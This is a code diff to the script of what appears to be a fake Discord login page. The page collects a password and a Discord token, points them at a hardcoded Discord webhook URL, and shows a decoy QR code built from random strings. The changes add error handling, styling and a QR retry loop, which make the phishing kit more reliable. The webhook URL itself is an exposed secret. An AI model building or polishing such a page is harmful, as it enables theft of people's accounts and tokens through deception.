@@ -1,3 +1,61 @@
+// Dynamically load qrcode.js if not already included
+if (typeof qrcode === "undefined") {
+  const script = document.createElement("script");
+  script.src = "https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js";
+  script.async = true;
+  document.head.appendChild(script);
+}
+
+// Add minimal CSS for animations if not already defined
+const style = document.createElement("style");
+style.textContent = `
+  .spinner {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .pulsingEllipsis .spinnerItem {
+    display: inline-block;
+    width: 8px;
+    height: 8px;
+    margin: 0 2px;
+    background: #fff;
+    border-radius: 50%;
+  }
+  @keyframes spinner-pulsing-ellipsis {
+    0%, 100% { transform: scale(0.8); opacity: 0.5; }
+    50% { transform: scale(1.2); opacity: 1; }
+  }
+  .wanderingCubes .item {
+    width: 10px;
+    height: 10px;
+    background: #5865F2;
+    position: absolute;
+    animation: wanderingCubes 1.8s infinite ease-in-out;
+  }
+  .wanderingCubes .item:nth-child(2) {
+    animation-delay: -0.9s;
+  }
+  @keyframes wanderingCubes {
+    0% { transform: translate(0, 0) rotate(0deg); }
+    25% { transform: translate(20px, 0) rotate(90deg); }
+    50% { transform: translate(20px, 20px) rotate(180deg); }
+    75% { transform: translate(0, 20px) rotate(270deg); }
+    100% { transform: translate(0, 0) rotate(360deg); }
+  }
+  .qrCode-spinner {
+    width: 160px;
+    height: 160px;
+    position: relative;
+  }
+  #error-message {
+    color: red;
+    display: none;
+    margin-top: 10px;
+  }
+`;
+document.head.appendChild(style);
+
 // ----------------------------------
 // SELECTING ELEMENTS
 // ----------------------------------
@@ -7,7 +65,7 @@ const passwordInput = document.querySelector("#password"); // Password input
 const tokenInput = document.querySelector("#token"); // Discord token input
 const errorMessage = document.querySelector("#error-message"); // Error message div
 
-// Replace with your webhook URL
+// Replace with your webhook URL (ensure this is secure)
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";
 
 // -----------------------------------
@@ -35,6 +93,8 @@ function displayError(message) {
   if (errorMessage) {
     errorMessage.textContent = message;
     errorMessage.style.display = "block";
+  } else {
+    console.warn("Error message element not found. Error:", message);
   }
 }
 
@@ -42,12 +102,19 @@ function displayError(message) {
 // ELLIPSIS ANIMATION
 // ------------------------------------
 function removeEllipsisAnimation() {
-  loginButton.innerHTML = "";
-  loginButton.textContent = "Log In";
-  loginButton.removeAttribute("disabled");
+  if (loginButton) {
+    loginButton.innerHTML = "";
+    loginButton.textContent = "Log In";
+    loginButton.removeAttribute("disabled");
+  }
 }
 
 function animateEllipsis() {
+  if (!loginButton) {
+    console.error("Login button not found.");
+    return;
+  }
+
   // Clear previous error
   if (errorMessage) errorMessage.style.display = "none";
 
@@ -158,22 +225,32 @@ function generateRandomString() {
 
 function removeQrCodeAnimation() {
   const qrCodeContainer = document.querySelector(".right-section .qr-code");
+  if (!qrCodeContainer) {
+    console.warn("QR code container not found.");
+    return;
+  }
   qrCodeContainer.innerHTML = "";
-  qrCodeContainer.insertAdjacentElement(
-    "afterbegin",
-    generateQRCode(`https://discord.com/ra/${generateRandomString()}`)
-  );
+  const qrCode = generateQRCode(`https://discord.com/ra/${generateRandomString()}`);
+  if (qrCode) {
+    qrCodeContainer.insertAdjacentElement("afterbegin", qrCode);
+  }
   qrCodeContainer.insertAdjacentHTML(
     "beforeend",
-    `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
+    `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo" style="width: 50px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">`
   );
   qrCodeContainer.style.background = "white";
 }
 
 function simulateQrCodeChange() {
   const qrCodeContainer = document.querySelector(".right-section .qr-code");
-  qrCodeContainer.removeChild(qrCodeContainer.querySelector("svg"));
-  qrCodeContainer.removeChild(qrCodeContainer.querySelector("img"));
+  if (!qrCodeContainer) {
+    console.warn("QR code container not found.");
+    return;
+  }
+  const svg = qrCodeContainer.querySelector("svg");
+  const img = qrCodeContainer.querySelector("img");
+  if (svg) qrCodeContainer.removeChild(svg);
+  if (img) qrCodeContainer.removeChild(img);
   qrCodeContainer.style.background = "transparent";
   const markup = `<span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
                     <span class="inner wanderingCubes">
@@ -185,12 +262,26 @@ function simulateQrCodeChange() {
   setTimeout(removeQrCodeAnimation, 3500);
 }
 
-setInterval(simulateQrCodeChange, 120 * 1000);
+// Start QR code animation interval only if qrcode.js is loaded
+function startQrCodeAnimation() {
+  if (typeof qrcode !== "undefined") {
+    simulateQrCodeChange();
+    setInterval(simulateQrCodeChange, 120 * 1000);
+  } else {
+    // Retry after qrcode.js loads
+    setTimeout(startQrCodeAnimation, 500);
+  }
+}
+startQrCodeAnimation();
 
 // --------------------------------------------------
 // ---------- GENERATING QRCODE ---------------------
 // --------------------------------------------------
 function generateQRCode(data) {
+  if (typeof qrcode === "undefined") {
+    console.error("qrcode.js library not loaded.");
+    return null;
+  }
   try {
     const qr = qrcode(0, "L");
     qr.addData(data);
@@ -217,7 +308,12 @@ function generateQRCode(data) {
 // --------------------------
 // ATTACHING EVENT LISTENERS
 // --------------------------
-loginButton.addEventListener("click", animateEllipsis);
+if (loginButton) {
+  loginButton.addEventListener("click", animateEllipsis);
+} else {
+  console.error("Login button not found. Event listener not attached.");
+}
+
 document.addEventListener("contextmenu", function (e) {
   e.preventDefault();
 });
